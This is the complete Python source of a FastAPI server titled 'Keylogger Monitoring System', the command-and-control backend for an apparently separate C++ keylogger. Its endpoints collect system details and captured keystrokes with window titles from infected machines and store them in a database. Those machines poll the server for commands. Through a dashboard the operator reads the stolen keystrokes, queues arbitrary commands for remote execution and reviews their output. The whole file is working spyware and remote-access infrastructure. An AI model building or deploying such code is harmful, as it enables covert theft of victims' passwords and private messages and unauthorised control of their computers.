import os
import logging
from fastapi import FastAPI, Request, HTTPException, Form, Query, Path, Depends
from fastapi.responses import JSONResponse, PlainTextResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any, Optional
import pymysql
from datetime import datetime, timedelta, timezone
import uuid
import dotenv
import queue # For thread-safe connection pooling

dotenv.load_dotenv()

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Database Configuration ---
DATABASE_HOST = os.getenv("DATABASE_HOST", "your_tidb_host")
DATABASE_PORT = int(os.getenv("DATABASE_PORT", 4000))
DATABASE_USER = os.getenv("DATABASE_USER", "your_tidb_user")
DATABASE_PASSWORD = os.getenv("DATABASE_PASSWORD", "your_tidb_password")
DATABASE_DB = os.getenv("DATABASE_DB", "keylogger_db")
TIDB_SSL_CERT_PATH = os.getenv("TIDB_SSL_CERT_PATH", "isrgrootx1.pem")

# --- Database Connection Pool ---
MAX_POOL_SIZE = 10
DB_CONNECT_TIMEOUT = 10 # Seconds for establishing a new connection
db_pool = queue.Queue(maxsize=MAX_POOL_SIZE)

def _create_raw_db_connection():
    """Helper function to create a single raw database connection."""
    try:
        ssl_params = {}
        if os.path.exists(TIDB_SSL_CERT_PATH):
            ssl_params = {"ca": TIDB_SSL_CERT_PATH}
            logger.info(f"Using SSL cert for DB connection: {TIDB_SSL_CERT_PATH}")
        else:
            logger.warning(f"SSL certificate not found at {TIDB_SSL_CERT_PATH}. Attempting DB connection without client CA verification.")

        conn = pymysql.connect(
            host=DATABASE_HOST,
            port=DATABASE_PORT,
            user=DATABASE_USER,
            password=DATABASE_PASSWORD,
            db=DATABASE_DB,
            ssl=ssl_params if ssl_params else None,
            cursorclass=pymysql.cursors.DictCursor,
            connect_timeout=DB_CONNECT_TIMEOUT, # Timeout for new connection attempt
            read_timeout=30, # Optional: Timeout for read operations
            write_timeout=30 # Optional: Timeout for write operations
        )
        logger.info(f"Successfully created new DB connection {id(conn)}.")
        return conn
    except pymysql.MySQLError as e:
        logger.error(f"Failed to create new DB connection: {e}")
        # Raising HTTPException here might be too aggressive if called during pool init.
        # Let's return None and handle it in the caller for pool init.
        return None
    except Exception as e: # Catch any other potential errors
        logger.error(f"An unexpected error occurred during raw DB connection creation: {e}")
        return None

# --- FastAPI App Setup ---
app = FastAPI(title="Keylogger Monitoring System", version="1.0")

@app.on_event("startup")
async def startup_db_pool():
    """Initialize the database connection pool on application startup."""
    logger.info(f"Initializing database pool with max size {MAX_POOL_SIZE}...")
    for _ in range(MAX_POOL_SIZE):
        try:
            conn = _create_raw_db_connection()
            if conn:
                db_pool.put_nowait(conn)
                logger.info(f"Added connection {id(conn)} to pool. Pool size: {db_pool.qsize()}")
            else:
                logger.warning("Failed to create a connection during pool initialization.")
        except queue.Full:
            logger.warning("DB Pool is full during initialization (should not happen with nowait).")
            break # Pool is full
        except Exception as e:
            logger.error(f"Error creating connection for pool: {e}")
    logger.info(f"Database pool initialized. Current size: {db_pool.qsize()}")

@app.on_event("shutdown")
async def shutdown_db_pool():
    """Close all database connections in the pool on application shutdown."""
    logger.info("Closing database connections in pool...")
    closed_count = 0
    while not db_pool.empty():
        try:
            conn = db_pool.get_nowait()
            conn.close()
            closed_count += 1
            logger.info(f"Closed connection {id(conn)} from pool.")
        except queue.Empty:
            break # Pool is empty
        except Exception as e:
            logger.error(f"Error closing connection from pool: {e}")
    logger.info(f"Database pool shutdown complete. Closed {closed_count} connections.")


async def get_db_connection_dependency(): # FastAPI Dependency
    """
    Gets a database connection from the pool.
    If the pool is empty, creates a new temporary one.
    Pings the connection to ensure liveness.
    Yields the connection and ensures it's returned to the pool.
    """
    conn = None
    created_new_for_request = False
    try:
        try:
            conn = db_pool.get(timeout=0.5) # Wait briefly for a connection
            logger.info(f"Retrieved connection {id(conn)} from pool. Pool size after get: {db_pool.qsize()}")
        except queue.Empty:
            logger.warning("DB Pool empty or timed out waiting. Creating a new temporary connection.")
            conn = _create_raw_db_connection()
            if conn:
                created_new_for_request = True
                logger.info(f"Created new temporary connection {id(conn)}.")
            else: # Failed to create new connection
                raise HTTPException(status_code=503, detail="Database service unavailable: Could not create new connection.")

        if not conn: # Should be caught by the else above, but as a safeguard
             raise HTTPException(status_code=503, detail="Database service unavailable: Failed to obtain connection.")

        # Check if connection is open and ping to ensure liveness
        if not conn.open:
            logger.warning(f"Connection {id(conn)} from pool was found closed. Discarding and creating new.")
            try: conn.close() # Ensure it's fully closed if it was just marked not open
            except Exception: pass
            conn = _create_raw_db_connection() # Create a fresh one
            if not conn:
                 raise HTTPException(status_code=503, detail="Database service unavailable: Failed to replace closed connection.")
            created_new_for_request = True # This new connection is temporary for this request
            logger.info(f"Replaced closed connection with new temporary connection {id(conn)}.")
        else:
            conn.ping(reconnect=True) # Ping to ensure it's alive, reconnect if server killed it
            logger.info(f"Connection {id(conn)} ping successful.")

        yield conn  # Provide the connection to the route

    except pymysql.MySQLError as e:
        logger.error(f"Database connection error during request: {e}")
        # If an error occurs with a pooled connection, it might be bad. Close it.
        if conn and not created_new_for_request: # Only close if it was from the pool
            logger.warning(f"Closing potentially bad pooled connection {id(conn)} due to error.")
            try:
                conn.close()
            except Exception as close_err:
                logger.error(f"Error closing bad pooled connection {id(conn)}: {close_err}")
            conn = None # Ensure it's not returned to pool
        raise HTTPException(status_code=503, detail=f"Database operation failed: {str(e)}")
    except Exception as e:
        logger.error(f"Unexpected error in get_db_connection_dependency: {e}")
        raise HTTPException(status_code=500, detail=f"Internal server error processing database request: {str(e)}")
    finally:
        if conn and conn.open:
            if created_new_for_request: # If we created it just for this request and pool might be full
                try:
                    db_pool.put_nowait(conn) # Try to add to pool if there's space
                    logger.info(f"Returned temporary connection {id(conn)} to pool. Pool size: {db_pool.qsize()}")
                except queue.Full:
                    logger.warning(f"DB Pool full. Closing temporary connection {id(conn)} instead of adding to pool.")
                    try: conn.close()
                    except Exception as e_close: logger.error(f"Error closing temporary connection {id(conn)}: {e_close}")
            else: # It was from the pool, so return it
                try:
                    db_pool.put_nowait(conn)
                    logger.info(f"Returned connection {id(conn)} to pool. Pool size after put: {db_pool.qsize()}")
                except queue.Full: # Should ideally not happen if taken from pool unless pool size changed or logic error
                    logger.error(f"DB Pool full when returning a pooled connection {id(conn)}. This is unexpected. Closing.")
                    try: conn.close()
                    except Exception as e_close: logger.error(f"Error closing pooled connection {id(conn)} on unexpected full pool: {e_close}")
                except Exception as e_put: # Other errors putting back
                    logger.error(f"Error returning connection {id(conn)} to pool: {e_put}. Closing it.")
                    try: conn.close()
                    except Exception as e_close: logger.error(f"Error closing connection {id(conn)} after pool put error: {e_close}")

        elif conn: # If conn exists but is not open (e.g., ping failed and it was closed by ping or error handling)
             logger.info(f"Connection {id(conn)} was not open at end of request, ensuring it's closed and not returned to pool.")
             try: conn.close() 
             except Exception: pass


# Mount static files
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# CORS Middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], allow_credentials=True,
    allow_methods=["*"], allow_headers=["*"],
)

# --- Pydantic Models (unchanged from previous version) ---
class MachineInfo(BaseModel):
    machine_id: str
    computer_name: Optional[str] = None
    os_version: Optional[str] = None
    # ... (rest of the model)
    processor_arch: Optional[str] = None
    num_processors: Optional[int] = None
    total_ram_mb: Optional[int] = None
    first_seen: datetime
    last_seen: datetime
    reported_ip: Optional[str] = None

class SimpleMachineInfoForDashboard(BaseModel):
    id: str 
    name: Optional[str] = None
    status: str
    cpu_usage: Optional[str] = "N/A"
    ram_usage: Optional[str] = "N/A"
    uptime: Optional[str] = "N/A"
    ip_address: Optional[str] = None
    last_seen: datetime

class KeylogEntryResponse(BaseModel):
    log_id: str
    machine_id: str
    client_timestamp: Optional[str] = None
    server_timestamp: datetime
    window_title: str
    log_data: str

class CommandEntryResponse(BaseModel):
    command_id: str
    machine_id: str
    command: str
    status: str
    sent_timestamp: datetime
    executed_timestamp: Optional[datetime] = None
    completed_timestamp: Optional[datetime] = None
    output: Optional[str] = None
    error: Optional[str] = None

class CommandCreateRequest(BaseModel): # Not directly used by form posts, but good for reference
    machine_id: str
    command: str

class CommandCreateResponse(BaseModel):
    command_id: str
    status: str
    message: Optional[str] = None

# --- API Endpoints for C++ Logger (Modified to use DB Dependency) ---

@app.post("/systeminfo", summary="Receive system information from C++ logger")
async def receive_system_info(
    request: Request,
    machine_id: str = Form(...),
    system_info: str = Form(...),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency) # Use new dependency
):
    client_ip = request.client.host if request.client else "Unknown IP"
    logger.info(f"Received system info from machine {machine_id} (IP: {client_ip}) using conn {id(conn)}")
    try:
        with conn.cursor() as cursor:
            # ... (rest of the logic is the same as before, just uses the provided 'conn')
            cursor.execute("SELECT machine_id, computer_name FROM machines WHERE machine_id = %s", (machine_id,))
            existing_machine = cursor.fetchone()

            computer_name = next((line.split(': ')[1] for line in system_info.split('\n') if line.startswith('Computer Name: ')), None)
            os_version = next((line.split(': ')[1] for line in system_info.split('\n') if line.startswith('OS Version: ')), None)
            processor_arch = next((line.split(': ')[1] for line in system_info.split('\n') if line.startswith('Processor Architecture: ')), None)
            num_processors_str = next((line.split(': ')[1] for line in system_info.split('\n') if line.startswith('Number of Processors: ')), None)
            num_processors = int(num_processors_str) if num_processors_str and num_processors_str.isdigit() else None
            total_ram_mb_str = next((line.split(': ')[1].replace(' MB', '') for line in system_info.split('\n') if line.startswith('Total Physical Memory: ')), None)
            total_ram_mb = int(total_ram_mb_str) if total_ram_mb_str and total_ram_mb_str.isdigit() else None

            if existing_machine:
                update_fields = {
                    "system_info_blob": system_info, 
                    "last_seen": datetime.now(),
                    "reported_ip": client_ip,
                    "os_version": os_version,
                    "processor_arch": processor_arch,
                    "num_processors": num_processors,
                    "total_ram_mb": total_ram_mb
                }
                if computer_name and (existing_machine.get('computer_name') is None or existing_machine.get('computer_name') == 'Unknown'):
                    update_fields["computer_name"] = computer_name
                elif computer_name: 
                     update_fields["computer_name"] = computer_name

                set_clause = ", ".join([f"{key} = %s" for key in update_fields.keys()])
                values = list(update_fields.values()) + [machine_id]
                cursor.execute(f"UPDATE machines SET {set_clause} WHERE machine_id = %s", tuple(values))
                logger.info(f"Updated system info for machine: {machine_id}")
            else:
                cursor.execute(
                    """
                    INSERT INTO machines (machine_id, computer_name, os_version, processor_arch, num_processors, total_ram_mb, reported_ip, system_info_blob, first_seen, last_seen)
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                    """,
                    (machine_id, computer_name if computer_name else "Unknown", os_version, processor_arch, num_processors, total_ram_mb, client_ip, system_info, datetime.now(), datetime.now())
                )
                logger.info(f"Registered new machine: {machine_id}")
            conn.commit()
        return JSONResponse(content={"message": "System info received"}, status_code=200)
    except pymysql.MySQLError as e: # More specific DB error handling
        conn.rollback() # Rollback on DB error
        logger.error(f"DB Error receiving system info for machine {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error processing system info (DB): {str(e)}")
    except Exception as e: # General errors
        # Check if conn has rollback, though for non-DB errors it might not be relevant unless mid-transaction
        if hasattr(conn, 'rollback'): conn.rollback()
        logger.error(f"General Error receiving system info for machine {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error processing system info: {str(e)}")
    # 'finally' block for closing connection is now handled by the dependency

@app.post("/log", summary="Receive keylog data from C++ logger")
async def receive_log_data(
    request: Request,
    machine_id: str = Form(...),
    client_timestamp: str = Form(...), 
    window_title: str = Form(...),
    log_data: str = Form(...),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
):
    client_ip = request.client.host if request.client else "Unknown IP"
    logger.info(f"Received log data from machine {machine_id} (IP: {client_ip}) using conn {id(conn)}")
    try:
        with conn.cursor() as cursor:
            # ... (rest of the logic is the same)
            cursor.execute("SELECT machine_id FROM machines WHERE machine_id = %s", (machine_id,))
            if cursor.fetchone() is None:
                 cursor.execute(
                    "INSERT INTO machines (machine_id, reported_ip, computer_name, first_seen, last_seen) VALUES (%s, %s, %s, %s, %s)",
                    (machine_id, client_ip, "Unknown (auto-created)", datetime.now(), datetime.now())
                 )
                 logger.warning(f"Received logs for unknown machine: {machine_id}. Created minimal machine entry.")

            log_entry_id = str(uuid.uuid4())
            cursor.execute(
                """
                INSERT INTO keylogs (log_id, machine_id, client_timestamp_str, window_title, log_data, server_timestamp)
                VALUES (%s, %s, %s, %s, %s, %s)
                """,
                (log_entry_id, machine_id, client_timestamp, window_title, log_data, datetime.now())
            )
            cursor.execute(
                "UPDATE machines SET last_seen = %s, reported_ip = %s WHERE machine_id = %s",
                (datetime.now(), client_ip, machine_id)
            )
            conn.commit()
        return JSONResponse(content={"message": "Log received"}, status_code=200)
    except pymysql.MySQLError as e:
        conn.rollback()
        logger.error(f"DB Error receiving log data for machine {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error processing log data (DB): {str(e)}")
    except Exception as e:
        if hasattr(conn, 'rollback'): conn.rollback()
        logger.error(f"General Error receiving log data for machine {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error processing log data: {str(e)}")

@app.post("/command/result", summary="Receive command execution result from C++ logger")
async def receive_command_result(
    request: Request,
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
):
    client_ip = request.client.host if request.client else "Unknown IP"
    logger.info(f"Received command result POST request from {client_ip} using conn {id(conn)}")
    command_id = "Unknown" 
    try:
        body = await request.body()
        result_string = body.decode('utf-8') # Specify UTF-8
        logger.info(f"Raw command result body: {result_string}")

        parts = result_string.split('|', 3)
        if len(parts) < 2: 
            logger.warning(f"Malformed command result string received: {result_string}")
            raise HTTPException(status_code=400, detail="Malformed command result string. Expected format: command_id|status|output|error")

        command_id = parts[0]
        status_str = parts[1] # Renamed to avoid conflict with status variable
        # Basic sanitization/validation for status_str
        valid_statuses = ['completed', 'failed', 'executing']
        if status_str not in valid_statuses:
             logger.warning(f"Command {command_id}: Invalid status '{status_str}' in result. Defaulting to 'failed'.")
             status_str = 'failed'
        
        output = parts[2] if len(parts) > 2 else "" 
        error = parts[3] if len(parts) > 3 else ""   

        with conn.cursor() as cursor:
            update_query = """
                UPDATE commands
                SET status = %s,
                    executed_timestamp = COALESCE(executed_timestamp, %s),
                    completed_timestamp = CASE WHEN %s IN ('completed', 'failed') THEN %s ELSE NULL END,
                    output = %s,
                    error = %s
                WHERE command_id = %s
            """
            current_ts = datetime.now()
            cursor.execute(update_query, (status_str, current_ts, status_str, current_ts, output, error, command_id))

            if cursor.rowcount == 0:
                 conn.rollback() # Rollback if command_id not found before raising
                 logger.warning(f"Command ID not found for result update: {command_id}")
                 return JSONResponse(content={"message": "Command ID not found, result not stored"}, status_code=404) 

            conn.commit()
        logger.info(f"Received result for command {command_id} with status: {status_str}")
        return JSONResponse(content={"message": "Command result received"}, status_code=200)
    except HTTPException: # Re-raise HTTPExceptions directly
         raise
    except pymysql.MySQLError as e:
        if conn.open: conn.rollback()
        logger.error(f"DB Error receiving command result for command {command_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error processing command result (DB): {str(e)}")
    except Exception as e:
        if conn.open and hasattr(conn, 'rollback'): conn.rollback()
        logger.error(f"General Error receiving command result for command {command_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error processing command result: {str(e)}")


@app.get("/commands/pending", summary="C++ logger polls for pending commands", response_class=PlainTextResponse)
async def get_pending_commands_for_client(
    id: str = Query(..., description="The machine_id of the client logger"),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
):
    logger.info(f"Polling for pending commands for machine_id: {id} using conn {id(conn)}")
    response_string = ""
    try:
        with conn.cursor() as cursor:
            # ... (rest of the logic is the same)
            cursor.execute(
                """
                SELECT command_id, command
                FROM commands
                WHERE machine_id = %s AND status = 'pending'
                ORDER BY sent_timestamp ASC
                LIMIT 10
                """,
                (id,)
            )
            pending_commands = cursor.fetchall()

            if pending_commands:
                command_ids_to_update = [cmd['command_id'] for cmd in pending_commands]
                placeholders = ','.join(['%s'] * len(command_ids_to_update))
                update_status_sql = f"UPDATE commands SET status = 'executing', executed_timestamp = %s WHERE command_id IN ({placeholders})"
                cursor.execute(update_status_sql, (datetime.now(), *command_ids_to_update))
                conn.commit() 

                for cmd in pending_commands:
                    cmd_id_clean = cmd['command_id'].replace('|', '').replace('\n', '')
                    cmd_str_clean = cmd['command'].replace('|', '').replace('\n', '')
                    response_string += f"{cmd_id_clean}|{cmd_str_clean}\n"
        
        logger.info(f"Returning {len(pending_commands)} pending commands for machine {id}")
        return PlainTextResponse(content=response_string, status_code=200)
    except pymysql.MySQLError as e:
        # Do not rollback here as it's mostly a read operation, though we do an update.
        # If update fails, client will just poll again.
        logger.error(f"DB Error fetching pending commands for machine {id}: {e}", exc_info=True)
        return PlainTextResponse(content="", status_code=500) # Client expects plain text
    except Exception as e:
        logger.error(f"General Error fetching pending commands for machine {id}: {e}", exc_info=True)
        return PlainTextResponse(content="", status_code=500)


# --- Dashboard HTML Serving ---
@app.get("/", response_class=HTMLResponse, summary="Serve the main dashboard page")
async def serve_dashboard(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

# --- Dashboard API Endpoints (Modified to use DB Dependency) ---

@app.get("/dashboard/api/devices", response_model=List[SimpleMachineInfoForDashboard], summary="List all registered machines for the dashboard")
async def dashboard_list_machines(conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)):
    logger.info(f"Dashboard: Listing machines using conn {id(conn)}")
    machine_list = []
    try:
        with conn.cursor() as cursor:
            # ... (rest of the logic is the same)
            cursor.execute(
                """
                SELECT machine_id, computer_name, reported_ip, last_seen, os_version, total_ram_mb
                FROM machines
                ORDER BY last_seen DESC
                """
            )
            machines_data = cursor.fetchall()

            for machine_db in machines_data:
                last_seen_dt = machine_db['last_seen']
                
                if not isinstance(last_seen_dt, datetime):
                    logger.warning(f"Machine {machine_db['machine_id']} has invalid last_seen_dt type: {type(last_seen_dt)}. Value: {last_seen_dt}. Using epoch as fallback.")
                    last_seen_dt = datetime.min.replace(tzinfo=timezone.utc) 
                elif last_seen_dt.tzinfo is None: 
                    last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)
                
                status = "offline" 
                current_aware_time = datetime.now(timezone.utc) 
                if current_aware_time - last_seen_dt < timedelta(minutes=5):
                    status = "active"
                elif current_aware_time - last_seen_dt < timedelta(minutes=30):
                    status = "idle"

                ram_info = "N/A"
                if machine_db.get('total_ram_mb'):
                    ram_info = f"{machine_db['total_ram_mb']} MB Total"

                machine_list.append(SimpleMachineInfoForDashboard(
                    id=machine_db['machine_id'],
                    name=machine_db.get('computer_name', 'Unknown'),
                    status=status,
                    ip_address=machine_db.get('reported_ip'),
                    last_seen=last_seen_dt, 
                    cpu_usage="N/A", 
                    ram_usage=ram_info, 
                    uptime="N/A" 
                ))
        logger.info(f"Dashboard: Returning {len(machine_list)} machines")
        return machine_list # Pydantic handles response model
    except pymysql.MySQLError as e:
        logger.error(f"Dashboard: DB Error listing machines: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error listing machines (DB): {str(e)}")
    except Exception as e:
        logger.error(f"Dashboard: General Error listing machines: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error listing machines: {str(e)}")

@app.get("/dashboard/api/devices/{machine_id}/details", summary="Get detailed system information for a machine")
async def dashboard_get_machine_system_info(
    machine_id: str = Path(..., description="ID of the machine"),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
):
    logger.info(f"Dashboard: Fetching system info for machine {machine_id} using conn {id(conn)}")
    try:
        with conn.cursor() as cursor:
            # ... (rest of the logic is the same)
            cursor.execute(
                """
                SELECT machine_id, computer_name, os_version, processor_arch, num_processors,
                       total_ram_mb, first_seen, last_seen, reported_ip, system_info_blob 
                FROM machines
                WHERE machine_id = %s
                """,
                (machine_id,)
            )
            sys_info_db = cursor.fetchone()

            if not sys_info_db:
                raise HTTPException(status_code=404, detail="Machine not found")

            system_info_blob_content = sys_info_db.get('system_info_blob', 'N/A')
            if system_info_blob_content is None: 
                system_info_blob_content = 'N/A (No system info blob recorded)'

            formatted_sys_info = f"Computer Name: {sys_info_db.get('computer_name', 'N/A')}\n" \
                                 f"OS Version: {sys_info_db.get('os_version', 'N/A')}\n" \
                                 f"Processor Architecture: {sys_info_db.get('processor_arch', 'N/A')}\n" \
                                 f"Number of Processors: {sys_info_db.get('num_processors', 'N/A')}\n" \
                                 f"Total Physical Memory: {sys_info_db.get('total_ram_mb', 'N/A')} MB\n" \
                                 f"Reported IP: {sys_info_db.get('reported_ip', 'N/A')}\n" \
                                 f"First Seen: {sys_info_db['first_seen'].isoformat() if sys_info_db.get('first_seen') else 'N/A'}\n" \
                                 f"Last Seen: {sys_info_db['last_seen'].isoformat() if sys_info_db.get('last_seen') else 'N/A'}\n" \
                                 f"\n--- Full System Info Blob ---\n{system_info_blob_content}"
            response_data = {
                 "machine_id": sys_info_db['machine_id'],
                 "computer_name": sys_info_db.get('computer_name'),
                 "os_version": sys_info_db.get('os_version'),
                 # ... (all other fields)
                 "processor_arch": sys_info_db.get('processor_arch'),
                 "num_processors": sys_info_db.get('num_processors'),
                 "total_ram_mb": sys_info_db.get('total_ram_mb'),
                 "first_seen": sys_info_db['first_seen'].isoformat() if sys_info_db.get('first_seen') else None,
                 "last_seen": sys_info_db['last_seen'].isoformat() if sys_info_db.get('last_seen') else None,
                 "reported_ip": sys_info_db.get('reported_ip'),
                 "system_info_string_formatted": formatted_sys_info, 
                 "system_info_blob": system_info_blob_content
            }
        return JSONResponse(content=response_data)
    except pymysql.err.OperationalError as db_op_err:
        if 'system_info_blob' in str(db_op_err).lower(): # Check if this is the specific error
            logger.error(f"Database schema error: 'system_info_blob' column missing. {db_op_err}", exc_info=True)
            raise HTTPException(status_code=500, detail="DB schema error: 'system_info_blob' column missing.")
        else: # Other operational errors
            logger.error(f"Dashboard: DB op error for machine {machine_id}: {db_op_err}", exc_info=True)
            raise HTTPException(status_code=500, detail=f"DB operational error: {str(db_op_err)}")
    except HTTPException:
         raise 
    except Exception as e:
        logger.error(f"Dashboard: General Error fetching system info for machine {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error fetching system info: {str(e)}")

@app.get("/dashboard/api/devices/{machine_id}/keylogs", response_model=List[KeylogEntryResponse], summary="Get keylogs for a specific machine")
async def dashboard_get_machine_logs(
    machine_id: str = Path(..., description="ID of the machine"),
    limit: int = Query(1000, ge=1, le=5000),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
):
    logger.info(f"Dashboard: Fetching logs for machine {machine_id}, limit {limit} using conn {id(conn)}")
    try:
        with conn.cursor() as cursor:
            # ... (rest of the logic is the same)
            cursor.execute(
                """
                SELECT log_id, machine_id, client_timestamp_str as client_timestamp,
                       server_timestamp, window_title, log_data
                FROM keylogs
                WHERE machine_id = %s
                ORDER BY server_timestamp DESC
                LIMIT %s
                """,
                (machine_id, limit)
            )
            logs_data = cursor.fetchall()
            for log_entry in logs_data:
                if log_entry['client_timestamp'] is None:
                    log_entry['client_timestamp'] = "" 
        logger.info(f"Dashboard: Returning {len(logs_data)} logs for machine {machine_id}")
        return logs_data 
    except pymysql.MySQLError as e:
        logger.error(f"Dashboard: DB Error fetching logs for machine {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error fetching logs (DB): {str(e)}")
    except Exception as e:
        logger.error(f"Dashboard: General Error fetching logs for machine {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error fetching logs: {str(e)}")


@app.post("/dashboard/api/devices/{machine_id}/command", response_model=CommandCreateResponse, summary="Send a command to a specific machine via dashboard")
async def dashboard_create_command(
    machine_id: str = Path(..., description="ID of the machine to command"),
    command_payload: Dict[str, str] = None, # Expecting JSON payload e.g. {"command": "the_command"}
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
):
    if command_payload is None or "command" not in command_payload: # Check payload from JS
        raise HTTPException(status_code=400, detail="Command payload is missing or malformed. Expected {'command': 'your_command'}.")
    
    command_str = command_payload["command"]
    logger.info(f"Dashboard: Received command '{command_str}' for machine {machine_id} using conn {id(conn)}")
    try:
        with conn.cursor() as cursor:
            # ... (rest of the logic is the same)
            cursor.execute("SELECT machine_id FROM machines WHERE machine_id = %s", (machine_id,))
            if cursor.fetchone() is None:
                 raise HTTPException(status_code=404, detail="Machine not found")

            command_id = str(uuid.uuid4())
            cursor.execute(
                """
                INSERT INTO commands (command_id, machine_id, command, status, sent_timestamp)
                VALUES (%s, %s, %s, %s, %s)
                """,
                (command_id, machine_id, command_str, 'pending', datetime.now())
            )
            conn.commit()
        logger.info(f"Dashboard: Created pending command {command_id} for machine {machine_id}")
        return CommandCreateResponse(command_id=command_id, status="pending", message="Command sent to client for execution.")
    except HTTPException:
        if conn.open: conn.rollback() # Rollback if HTTP exception occurred after potential DB changes
        raise
    except pymysql.MySQLError as e:
        if conn.open: conn.rollback()
        logger.error(f"Dashboard: DB Error creating command for {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error creating command (DB): {str(e)}")
    except Exception as e:
        if conn.open and hasattr(conn, 'rollback'): conn.rollback()
        logger.error(f"Dashboard: General Error creating command for {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error creating command: {str(e)}")

@app.get("/dashboard/api/devices/{machine_id}/commands", response_model=List[CommandEntryResponse], summary="Get command history for a machine")
async def dashboard_get_machine_commands(
    machine_id: str = Path(..., description="ID of the machine"),
    limit: int = Query(100, ge=1, le=1000),
    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
):
    logger.info(f"Dashboard: Fetching command history for machine {machine_id}, limit {limit} using conn {id(conn)}")
    try:
        with conn.cursor() as cursor:
            # ... (rest of the logic is the same)
            cursor.execute(
                """
                SELECT command_id, machine_id, command, status, sent_timestamp,
                       executed_timestamp, completed_timestamp, output, error
                FROM commands
                WHERE machine_id = %s
                ORDER BY sent_timestamp DESC
                LIMIT %s
                """,
                (machine_id, limit)
            )
            commands_data = cursor.fetchall()
        logger.info(f"Dashboard: Returning {len(commands_data)} command history entries for {machine_id}")
        return commands_data
    except pymysql.MySQLError as e:
        logger.error(f"Dashboard: DB Error fetching commands for {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error fetching commands (DB): {str(e)}")
    except Exception as e:
        logger.error(f"Dashboard: General Error fetching commands for {machine_id}: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error fetching commands: {str(e)}")


@app.get("/dashboard/api/devices/{machine_id}/screenshot", summary="Placeholder for machine screenshot")
async def dashboard_get_machine_screenshot(machine_id: str = Path(..., description="ID of the machine")):
    # This endpoint does not require DB access currently
    logger.info(f"Dashboard: Screenshot requested for machine {machine_id} (placeholder)")
    return JSONResponse(content={
        "timestamp": datetime.now().isoformat(),
        "screenshot_url": f"https://placehold.co/640x480/grey/white?text=Screenshot+{machine_id}\\n(Not+Implemented)",
        "message": "Screenshot functionality is not yet implemented."
    })


if __name__ == "__main__":
    import uvicorn
    logger.info("Starting Uvicorn server for Keylogger Monitoring System with DB Pool")
    uvicorn.run(app="main:app", host="0.0.0.0", port=8000)
